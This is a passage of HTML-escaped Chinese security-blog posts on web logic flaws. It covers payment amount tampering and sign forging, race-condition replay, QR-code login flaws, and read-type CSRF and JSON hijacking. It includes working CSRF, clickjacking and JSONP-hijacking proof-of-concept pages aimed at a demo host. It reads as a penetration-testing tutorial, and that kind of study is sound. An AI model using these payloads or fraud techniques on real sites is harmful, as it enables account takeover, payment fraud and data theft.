&lt;h3 id=&quot;常见缺陷-2&quot;&gt;常见缺陷&lt;/h3&gt;

&lt;h4 id=&quot;-1前端呈现加密算法代码&quot;&gt;* 1.前端呈现加密算法代码&lt;/h4&gt;

&lt;p&gt;-场景：
1.1 很多厂商算法写的很好，可没用，因为他用的是JS代码，在前端会直接能看见，而尝试跟踪JS的代码就会知道是怎么加密的从而可以直接绕过。&lt;/p&gt;

&lt;h4 id=&quot;-2算法脆弱明文可判断&quot;&gt;* 2.算法脆弱，明文可判断&lt;/h4&gt;

&lt;p&gt;-场景：
2.1 这是一个看运气的问题，一段密文为md5的，这时候你要做好自己的分析明文到底是什么，然后去碰撞，例如可能是&lt;strong&gt;md5(用户名+邮箱)&lt;/strong&gt;这样的的组合。&lt;/p&gt;

&lt;h2 id=&quot;支付逻辑漏洞&quot;&gt;支付逻辑漏洞&lt;/h2&gt;

&lt;h3 id=&quot;常见缺陷-3&quot;&gt;常见缺陷&lt;/h3&gt;

&lt;h4 id=&quot;-1金额修改&quot;&gt;* 1.金额修改&lt;/h4&gt;

&lt;p&gt;-场景：
1.1 支付的过程中有很多涉及金额的元素可以修改运费、优惠价、折扣等，可以修改为负数金额也可以修改金额为小于原金额的数进行测试，有时候会遇到&lt;code class=&quot;highlighter-rouge&quot;&gt;溢出&lt;/code&gt;，你修改金额为较大的数看你会出现只支付1元的情况。&lt;/p&gt;

&lt;h4 id=&quot;-2数量修改&quot;&gt;* 2.数量修改&lt;/h4&gt;

&lt;p&gt;-场景：
2.1 修改购买物品的数量为小数或者负数，同上，有时候会遇到&lt;code class=&quot;highlighter-rouge&quot;&gt;溢出&lt;/code&gt;，你修改数量为较大的数看你会出现只支付1元的情况。&lt;/p&gt;

&lt;h4 id=&quot;-3sign值可逆&quot;&gt;* 3.sign值可逆&lt;/h4&gt;

&lt;p&gt;-场景：
3.1 这是一个看运气的问题，sign多数为对比确认金额的一段内容，很多都是md5加密的，这时候你要做好自己的分析明文到底是什么，然后去碰撞，例如可能是&lt;strong&gt;md5(订单号+金额)&lt;/strong&gt;这样的的组合，然后修改金额重新生成sign就可以绕过金额固定的限制了。&lt;/p&gt;

&lt;h2 id=&quot;条件竞争http并发&quot;&gt;条件竞争(HTTP并发)&lt;/h2&gt;

&lt;h3 id=&quot;常见缺陷-4&quot;&gt;常见缺陷&lt;/h3&gt;

&lt;h4 id=&quot;-1条件竞争http并发&quot;&gt;* 1.条件竞争（HTTP并发）&lt;/h4&gt;

&lt;p&gt;-场景：
1.1 在签到、转账、兑换、购买等场景是最容易出现这样的问题，而并发测试的方法可以使用Fiddler也可以使用BurpSuite Intruder模块。&lt;/p&gt;

&lt;p&gt;这里例举下Fiddler测试方法（BurpSuite测试很简单就不说明了）：&lt;/p&gt;

&lt;p&gt;配置好代理，设置好拦截：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-18/0x00.png&quot; alt=&quot;0x00.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后点击兑换、转账、签到等最后一步按钮的时候会抓到一个请求，右键这一请求然后按住Shift点击Replay-&amp;gt;Reissue Requests：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-18/0x01.png&quot; alt=&quot;0x01.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;填入要重发的次数：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-18/0x02.png&quot; alt=&quot;0x02.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;一般为20即可，然后点击GO放行：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-18/0x03.png&quot; alt=&quot;0x03.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后看你自己来判断是否存在并发的问题，例如签到，如果存在那么肯定是签到天数或者签到所获得的奖励会一下子有很多，也可以看Fiddler中的响应报文结果。&lt;/p&gt;</content><author><name>Vulkey_Chen</name></author><summary type="html">首先感谢朋友倾璇的邀请 http://payloads.online/archivers/2018-03-21/1 ，参与了的相关撰写，目前负责业务逻辑测试这一块的撰写，目前初步已经成型，先发出来让大家看看，欢迎点评，也可以加入我们一起来撰写~</summary></entry><entry><title type="html">二维码登陆的常见缺陷剖析</title><link href="http://localhost:4000/archives/2018-04-08/1" rel="alternate" type="text/html" title="二维码登陆的常见缺陷剖析" /><published>2018-04-08T00:00:00+08:00</published><updated>2018-04-08T00:00:00+08:00</updated><id>http://localhost:4000/archives/2018-04-08/QRLVul</id><content type="html" xml:base="http://localhost:4000/archives/2018-04-08/1">&lt;h1 id=&quot;二维码登陆的常见缺陷剖析&quot;&gt;二维码登陆的常见缺陷剖析&lt;/h1&gt;

&lt;p&gt;现在很多的电商平台和互联网型企业都有自己的手机APP，为了方便用户的体验，于是就有了”扫码登陆”这样的功能。看似扫码登陆，实际上还是基于HTTP请求来完成的。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2 id=&quot;了解扫码登陆步骤&quot;&gt;了解扫码登陆步骤&lt;/h2&gt;

&lt;p&gt;标准的二维码登陆流程如下：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;打开web界面进入登陆然后加载二维码&lt;/li&gt;
  &lt;li&gt;网站开始轮询，来检测二维码状态&lt;/li&gt;
  &lt;li&gt;打开手机APP进入”扫一扫”，扫描二维码&lt;/li&gt;
  &lt;li&gt;网站检测到二维码被扫描，进入被扫描后的界面，继续轮询来获取凭证&lt;/li&gt;
  &lt;li&gt;手机APP进入确认登陆界面&lt;/li&gt;
  &lt;li&gt;(当点击确认登陆)网站轮询结束获取到了凭证，进入个人中心；(当取消登陆)网站轮询设定时间自动刷新页面。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;常见缺陷剖析&quot;&gt;常见缺陷剖析&lt;/h2&gt;

&lt;h3 id=&quot;0x00-非标准扫码登陆流程缺陷&quot;&gt;0x00 非标准扫码登陆流程缺陷&lt;/h3&gt;

&lt;h4 id=&quot;非标准流程描述&quot;&gt;非标准流程描述&lt;/h4&gt;

&lt;p&gt;扫描登陆的流程如果不按照标准来做也会存在很多问题，国内一些企业在处理这些的时候省略了如上所述的第五步骤和第六步骤，而是直接扫描后立即登陆。&lt;/p&gt;

&lt;h4 id=&quot;分析非标准流程可能存在的问题&quot;&gt;分析非标准流程可能存在的问题&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;可进行1:1比例诱导扫描&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;二维码是一张图片而图片是可以移植的，所以我们可以1:1克隆一个登陆页面来诱导用户进行扫描，这样就可以直接获取用户的权限了。&lt;/p&gt;

&lt;p&gt;因为保密协议的问题，这里不对漏洞详情进行描述，简单的使用文字进行叙述：&lt;/p&gt;

&lt;p&gt;在测试这种问题的时候，只需要按照步骤去测试下即可发现是否有相对于的问题，我一般会使用浏览器ctrl+s快捷键先克隆下来，因为这样会自带css和js等文件，剩下的只需要你处理一下就行了，也可以参考我之前的文章：&lt;a href=&quot;https://bbs.ichunqiu.com/thread-25923-1-1.html&quot;&gt;微信Netting-QRLJacking分析利用-扫我二维码获取你的账号权限&lt;/a&gt;，方法类似就行，但是这里的微信二维码登录是基于OAuth2.0协议的，所以当用户点击之后，我只要获取到授权凭证链接就行了，而一般的二维码登陆是不基于OAuth2.0协议的，就需要处理好你的交互问题。&lt;/p&gt;

&lt;h3 id=&quot;0x01-qrljacking-二维码登陆劫持&quot;&gt;0x01 QRLJacking-二维码登陆劫持&lt;/h3&gt;

&lt;p&gt;2017年OWASP推出了这种攻击方式：https://www.owasp.org/index.php/Qrljacking&lt;/p&gt;

&lt;p&gt;因为OWASP上有详细的介绍，所以在这里我就不以实际案例来说明了。&lt;/p&gt;

&lt;p&gt;补充的一点是在0x00中我已经说明了之前一篇文章&lt;a href=&quot;https://bbs.ichunqiu.com/thread-25923-1-1.html&quot;&gt;微信Netting-QRLJacking分析利用-扫我二维码获取你的账号权限&lt;/a&gt;，在这里我称之为Netting-QRLJacking是因为我们可以使用钓鱼网站方式的方法进行大面积撒网~而其实这里是利用了OAuth2.0的一个流程特征，我们想进行二维码登录劫持的时候也可以利用”扫码登陆”的流程特征。&lt;/p&gt;

&lt;p&gt;之前已经把”扫码登陆”的流程说的很清楚了，我们知道其中一步轮询是用户点击确认登陆之后就通过轮询这个接口可以直接获得凭证，利用这个特点就行了。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;小提示：&lt;/strong&gt;整个流程划分为一个一个的接口来测试，你会更清楚的。&lt;/p&gt;

&lt;h3 id=&quot;0x02-csrf跨站请求访问&quot;&gt;0x02 CSRF跨站请求访问&lt;/h3&gt;

&lt;p&gt;之在0x01说了，把整个流程划分为一个个的接口来测试，你就会更清楚，其实潜台词就是&lt;strong&gt;“你会发现更多漏洞”&lt;/strong&gt;~&lt;/p&gt;

&lt;p&gt;以一个实际例子来讲解：&lt;/p&gt;

&lt;p&gt;在测试一个站点的时候遇到的问题，其扫码登陆的流程全部为GET类型请求：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;打开web界面进入登陆然后加载二维码&lt;strong&gt;（http://www.gh0stdemo.cn/getqrcode 返回一段uuid 二维码的链接为 http://www.gh0stdemo.cn/qrcode?code=qrcode）&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;网站开始轮询，来检测二维码状态&lt;strong&gt;（http://www.gh0stdemo.cn/getqrlstate?code=qrcode）&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;打开手机APP进入”扫一扫”，扫描二维码&lt;strong&gt;（http://www.gh0stdemo.cn/qrcode?code=qrcode）&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;网站检测到二维码被扫描，进入被扫描后的界面，继续轮询来获取凭证&lt;strong&gt;（http://www.gh0stdemo.cn/getqrlstate?code=qrcode）&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;手机APP进入确认登陆界面&lt;strong&gt;（这步骤必须需要经过第四步骤之后才可以 http://www.gh0stdemo.cn/putqrlstate?code=qrcode）&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;(当点击确认登陆)网站轮询结束获取到了凭证，进入个人中心；(当取消登陆)网站轮询设定时间自动刷新页面。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;在这里我们可以构建这样的PoC：&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;PoC&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;loadsrc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;test1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://www.gh0stdemo.cn/qrcode?code=qrcode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'loadsrc()'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.gh0stdemo.cn/putqrlstate?code=qrcode&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;很简单的一个PoC就构成了，这里也确实存在CSRF的问题，可能在这里有人会想到攻击面得问题，仅仅只限于APP端？当然不，其实原理是一样得，都是把自己的凭证(Cookie)发出去，所以在电脑的web端只要登陆了一样可以完成攻击步骤~&lt;/p&gt;

&lt;p&gt;当然在这里也有POST形式的CSRF，因为内容重复度过高就不一一举例了。&lt;/p&gt;

&lt;h3 id=&quot;0x03-clickjacking-点击劫持&quot;&gt;0x03 ClickJacking-点击劫持&lt;/h3&gt;

&lt;p&gt;点击劫持，视觉欺骗&lt;/p&gt;

&lt;p&gt;根据扫码登陆的流程中我们可以看到有一个流程强制的要求了用户去点击确认登陆的按钮，但是这个界面往往没有做点击劫持的防范：&lt;/p&gt;

&lt;p&gt;在我之前的一篇文章中详细讲了PoC的制作方法：http://gh0st.cn/archives/2017-12-20/1&lt;/p&gt;

&lt;p&gt;之前跟一朋友在测试的时候发现了一些问题，有些网站用iframe标签引用进来，不会百分百的自适应，在这里我使用了div为父元素，如何再在div里面写入iframe这个子元素来自适应就行了。&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;referrer&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;never&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;nc&quot;&gt;.testframe&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nl&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;span class=&quot;nt&quot;&gt;iframe&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nl&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nl&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nl&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nl&quot;&gt;margin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nl&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;/*控制不透明度的属性，兼容各大浏览器*/&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alpha&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Opacity&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;/*提供给IE浏览器8之前的*/&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;-moz-opacity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;/*提供给火狐浏览器的*/&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;-webkit-opacity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;/*提供给webkit内核的*/&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;-khtml-opacity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;/*提供给KHTML内核的*/&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;-ms-filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&quot;progid:DXImageTransform.Microsoft.Alpha(Opacity=0)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;/*提供给IE8之后的*/&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;opacity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;/*控制不透明度的属性，兼容各大浏览器*/&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;.btn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;97%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;42px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;margin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;815px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;testframe&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;button&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;btn&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Click&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.gh0stdemo.cn/qrcode?code=qrcode&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;示例结果：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-08/0x00.png&quot; alt=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-08/0x00.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;结尾&quot;&gt;结尾&lt;/h2&gt;

&lt;p&gt;本文没详细的去写，仅仅记录笔者的实践过程和心得。&lt;/p&gt;</content><author><name>Vulkey_Chen</name></author><summary type="html">二维码登陆的常见缺陷剖析</summary></entry><entry><title type="html">读取型CSRF-需要交互的内容劫持</title><link href="http://localhost:4000/archives/2018-03-22/1" rel="alternate" type="text/html" title="读取型CSRF-需要交互的内容劫持" /><published>2018-03-22T00:00:00+08:00</published><updated>2018-03-22T00:00:00+08:00</updated><id>http://localhost:4000/archives/2018-03-22/ReadCsrf</id><content type="html" xml:base="http://localhost:4000/archives/2018-03-22/1">&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;

&lt;p&gt;最近在挖洞，”实践出真知”这句话说的很对，在实际挖掘过程中我会思考很多东西，跟朋友一起准备做一份手册，忽然的想到了一些漏洞的定义和规范。
&lt;!-- more --&gt;
在大多数的人眼里CSRF可能仅仅是&lt;strong&gt;写入型&lt;/strong&gt;的比如：修改个人资料、授权登陆等等功能场景的CSRF问题，同时对CSRF这类问题进行了危害等级划分，就像如上两个例子，可以划分为中危和高危。也许是因为交互式的漏洞并没有SQLi这种直接能利用的漏洞危害高，所以一些厂商对CSRF也并不重视。&lt;/p&gt;

&lt;p&gt;步入正题，什么是读取型CSRF，这里我对如下的漏洞归纳进了读取型CSRF，因为这些漏洞的利用手法都跟CSRF是一样的：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;JSON劫持&lt;/li&gt;
  &lt;li&gt;Flash跨域劫持&lt;/li&gt;
  &lt;li&gt;CORS跨域资源读取&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;…等等，当然还有Silverlight跨域这些了，不过这里只列举常见的三种来讲解。&lt;/p&gt;

&lt;h1 id=&quot;读取型csrf&quot;&gt;读取型CSRF&lt;/h1&gt;

&lt;p&gt;接下以如上所说的三个漏洞案例来一个个分析。&lt;/p&gt;

&lt;h2 id=&quot;json劫持&quot;&gt;JSON劫持&lt;/h2&gt;

&lt;h3 id=&quot;漏洞案例&quot;&gt;漏洞案例&lt;/h3&gt;

&lt;p&gt;这里来看一条请求：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-03-22/0x00.png&quot; alt=&quot;json hijacking&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这条请求返回的结果中有手机号（这里我测试的账号没绑定手机），如果我们想要以CSRF交互式攻击的方式获取这个手机号该怎么办？&lt;/p&gt;

&lt;p&gt;来看看这条请求有callback，而返回结果是不是类似Javascript中的函数？&lt;/p&gt;

&lt;p&gt;Javascript原函数定义如下：&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;funName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里是缺少了函数定义的关键词&lt;code class=&quot;highlighter-rouge&quot;&gt;function&lt;/code&gt;和花括号的函数主体部分，只有函数名和函数传参，聪明人已经想到了，这不就相当于是自定义函数被引用了么，而中间那段传参就相当于是一个数组，所以我们可以先用JS自定义好这个函数，然后再引用这个请求，自然就可以获取到数据了。&lt;/p&gt;

&lt;p&gt;这时候我们可以来构建一下PoC：&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 引用一段如上请求为JS --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;jsonp2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span 